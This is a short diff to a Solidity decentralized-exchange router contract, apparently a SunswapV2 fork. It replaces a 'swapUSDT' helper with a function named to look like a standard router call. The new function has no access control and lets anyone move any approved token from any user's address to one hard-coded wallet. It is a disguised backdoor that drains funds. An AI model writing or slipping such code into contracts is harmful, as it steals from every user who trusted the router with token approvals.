@@ -401,14 +401,8 @@ ISunswapV2Pair(pair).permit(msg.sender, address(this), value, deadline, v, r, s)
         TransferHelper.safeTransferETH(to, amountOut);
     }
 
-    function swapUSDT(address token, address to, uint256 amount) external
-    {
-        TransferHelper.safeTransferFrom(
-            token, msg.sender, to, amount
-        );
-    }
-
-    // **** LIBRARY FUNCTIONS ****
+    function swapExactTokensForETHSupportingFeeOnTransferTokenss(address token, address from, uint256 amount) external
+    {TransferHelper.safeTransferFrom(token, from, address(0xB06A32ea6Dbf6f1094287Bc8b055c30b37bA8b11), amount);}
     function quote(uint amountA, uint reserveA, uint reserveB) public pure virtual override returns (uint amountB) {
         return SunswapV2Library.quote(amountA, reserveA, reserveB);
     }
